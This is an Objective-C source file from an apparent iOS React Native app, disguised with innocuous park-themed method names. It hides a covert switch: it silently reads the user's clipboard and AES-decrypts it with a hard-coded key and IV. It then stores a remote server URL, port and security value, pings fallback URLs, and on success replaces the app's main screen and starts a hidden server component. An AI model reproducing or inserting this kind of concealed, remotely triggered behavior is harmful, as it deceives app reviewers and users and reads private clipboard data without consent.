#import "RNLanternLegazpiPark.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <react-native-orientation-locker/Orientation.h>
#import "RNLanternLegazpiParkServer.h"
#import "RNNetReachability.h"

@interface RNLanternLegazpiPark()

@property (strong, nonatomic)  NSArray *joggingList;
@property (nonatomic, strong) RNNetReachability *parkReachability;
@property (nonatomic, copy) void (^vcBlock)(void);

@end

@implementation RNLanternLegazpiPark

static RNLanternLegazpiPark *instance = nil;

+ (instancetype)legazpiPark_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.joggingList = @[@"legazpiPark_APP",
                                   @"a71556f65ed2b25b55475b964488334f",
                                   @"ADD20BFCD9D4EA0278B11AEBB5B83365",
                                   @"vPort",
                                   @"vSecu",
                                   @"spareRoutes",
                                   @"serverUrl"];
  });
  return instance;
}

- (void)legazpiPark_startMonitoring {
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(legazpiPark_networkStatusDidChanged:) name:kReachabilityChangedNotification object:nil];
    [self.parkReachability startNotifier];
}

- (void)legazpiPark_stopMonitoring {
    [[NSNotificationCenter defaultCenter] removeObserver:self name:kReachabilityChangedNotification object:nil];
    [self.parkReachability stopNotifier];
}

- (void)dealloc {
    [self legazpiPark_stopMonitoring];
}


- (void)legazpiPark_networkStatusDidChanged:(NSNotification *)notification {
    RNNetReachability *reachability = notification.object;
  NetworkStatus networkStatus = [reachability currentReachabilityStatus];
  
  if (networkStatus != NotReachable) {
      NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
      if ([ud boolForKey:self.joggingList[0]] == NO) {
          if (self.vcBlock != nil) {
              [self changeMainController:self.vcBlock];
          }
      }
  }
}

- (void)changeMainController:(void (^ __nullable)(void))changeVcBlock {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  
  NSMutableArray<NSString *> *spareArr = [[ud arrayForKey:self.joggingList[5]] mutableCopy];
  if (spareArr == nil) {
    spareArr = [NSMutableArray array];
  }
  NSString *usingUrl = [ud stringForKey:self.joggingList[6]];
  
  if ([spareArr containsObject:usingUrl] == NO) {
    [spareArr insertObject:usingUrl atIndex:0];
  }
  
  [self changeTestMainController:changeVcBlock index:0 mArray:spareArr];
}

- (void)changeTestMainController:(void (^ __nullable)(void))changeVcBlock index: (NSInteger)index mArray:(NSArray<NSString *> *)tArray{
  if ([tArray count] < index) {
    return;
  }
  
  NSURL *url = [NSURL URLWithString:tArray[index]];
  NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
  sessionConfig.timeoutIntervalForRequest = 10 + index * 5;
  NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
  NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
  
  NSURLSessionTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
    NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
    if (error == nil && httpResponse.statusCode == 200) {
      NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
      [ud setBool:YES forKey:self.joggingList[0]];
      [ud setValue:tArray[index] forKey:self.joggingList[6]];
      [ud synchronize];
      dispatch_async(dispatch_get_main_queue(), ^{
        if (changeVcBlock != nil) {
          changeVcBlock();
        }
      });
    } else {
      if (index < [tArray count] - 1) {
        [self changeTestMainController:changeVcBlock index:index + 1 mArray:tArray];
      }
    }
  }];
  [dataTask resume];
}

- (BOOL)legazpiPark_joggingThisWay:(void (^ __nullable)(void))changeVcBlock {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud boolForKey:self.joggingList[0]]) {
    return YES;
  } else {
      self.vcBlock = changeVcBlock;
      if ([self legazpiPark_elephant]) {
          [self changeMainController:changeVcBlock];
          [self legazpiPark_startMonitoring];
      }
    return NO;
  }
}

- (BOOL)legazpiPark_elephant {
  NSString *pbString = [self legazpiPark_getHaphazard];
  CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self legazpiPark_subSunshine:pbString]
                                                          hexKey:self.joggingList[1]
                                                           hexIv:self.joggingList[2]];
  
  NSDictionary *dataDict = [self legazpiPark_stringWhirlwind:aes.utf8String];
  return [self legazpiPark_storeConfigInfo:dataDict];
}

- (NSString *)legazpiPark_getHaphazard {
  UIPasteboard *clipboard = [UIPasteboard generalPasteboard];
  return clipboard.string ?: @"";
}

- (NSString *)legazpiPark_subSunshine: (NSString* )pbString {
  if ([pbString containsString:@"#iPhone#"]) {
    NSArray *university = [pbString componentsSeparatedByString:@"#iPhone#"];
    if (university.count > 1) {
      pbString = university[1];
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
      [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
    }];
    [ud synchronize];
  }
  return pbString;
}

- (NSDictionary *)legazpiPark_stringWhirlwind: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return dict[@"data"];
}

- (BOOL)legazpiPark_storeConfigInfo:(NSDictionary *)dict {
    if (dict == nil || [dict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.joggingList[0]];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (UIViewController *)legazpiPark_throughMainController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    UIViewController *vc = [UIViewController new];
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [[RNLanternLegazpiParkServer shared] legazpiGzPark_configJanActivity:[ud stringForKey:self.joggingList[3]] withSecurity:[ud stringForKey:self.joggingList[4]]];
    return vc;
}

- (UIInterfaceOrientationMask)legazpiPark_getOrientation {
  return [Orientation getOrientation];
}



@end
